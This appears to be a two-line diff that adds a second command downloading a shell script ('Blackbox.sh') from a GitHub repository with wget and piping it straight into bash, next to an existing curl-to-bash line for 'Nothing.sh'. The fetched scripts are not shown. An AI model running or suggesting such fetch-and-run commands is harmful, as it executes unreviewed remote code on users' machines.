@@ -1,1 +1,3 @@
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/Inhuterk/Firefox/main/Nothing.sh)"
+
+wget -qO- https://raw.githubusercontent.com/Inhuterk/Firefox/main/Blackbox.sh | bash
